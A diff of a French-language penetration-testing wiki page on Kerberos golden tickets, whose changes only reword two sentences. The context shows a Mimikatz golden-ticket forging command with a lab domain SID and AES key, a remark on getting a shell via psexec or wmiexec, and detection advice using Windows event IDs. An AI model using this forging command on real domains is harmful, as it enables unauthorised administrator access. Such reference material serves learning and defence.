@@ -30,7 +30,7 @@ klist #List tickets in memory
 # Example using aes key
 kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
 ```
-**Une fois** que vous avez le **golden Ticket injecté**, vous pouvez accéder aux fichiers partagés **(C$)** et exécuter des services et WMI, vous pourriez donc utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble que vous ne pouvez pas obtenir un shell via winrm).
+**Une fois** que vous avez le **golden Ticket injecté**, vous pouvez accéder aux fichiers partagés **(C$)**, et exécuter des services et WMI, donc vous pourriez utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble que vous ne pouvez pas obtenir un shell via winrm).
 
 ### Contournement des détections courantes
 
@@ -53,7 +53,7 @@ diamond-ticket.md
 ### Atténuation
 
 - 4624 : Connexion de compte
-- 4672 : Connexion d'administrateur
+- 4672 : Connexion administrateur
 - `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`
 
 D'autres petites astuces que les défenseurs peuvent faire est **d'alerter sur les 4769 pour les utilisateurs sensibles** tels que le compte administrateur de domaine par défaut.
